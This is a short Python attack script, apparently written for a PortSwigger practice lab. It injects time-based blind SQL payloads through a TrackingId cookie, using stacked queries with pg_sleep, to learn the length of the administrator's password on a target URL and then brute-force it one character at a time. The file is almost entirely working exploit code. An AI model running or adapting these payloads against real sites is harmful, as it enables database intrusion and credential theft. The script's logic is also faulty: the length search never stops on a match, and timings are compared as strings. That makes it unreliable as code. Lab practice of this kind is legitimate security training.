#this script for portswigger blind sql injection conditional response challange
import requests
import string
a='abcdefghijklmnopqrstuvwxyz1234567890'
length=int(input('Input Max Password Length : '))+int(1)
password=''
url=input('Input url Please : ')
r = int(1)
while str(r) < str(10):
    for x in range(1,length,1):
        cookies = dict(TrackingId='x\'%3BSELECT+CASE+WHEN+(username=\'administrator\'+AND+length(password)='+str(x)+')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--')
        r = str(requests.get(url=url, cookies=cookies).elapsed)[5:7]
print('Passsword length = '+str(x))
z=int(x)+int(1)
print('Now Brute Frocing Password Please wait')
while str(len(password)) != str(x) :
    for j in range(1,z,1) :
        for i in a:
            cookies =dict(TrackingId='x\'%3BSELECT+CASE+WHEN+(username=\'administrator\'+AND+substring(password,'+str(j)+',1)=\''+i+'\')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--')
            print(cookies)
            r = str(requests.get(url=url, cookies=cookies).elapsed)[5:7]
            if str(r) >= str(10):
                password += i
                print('Found One More Character = '+password)
                break
print('This Is your Password = '+password)
                

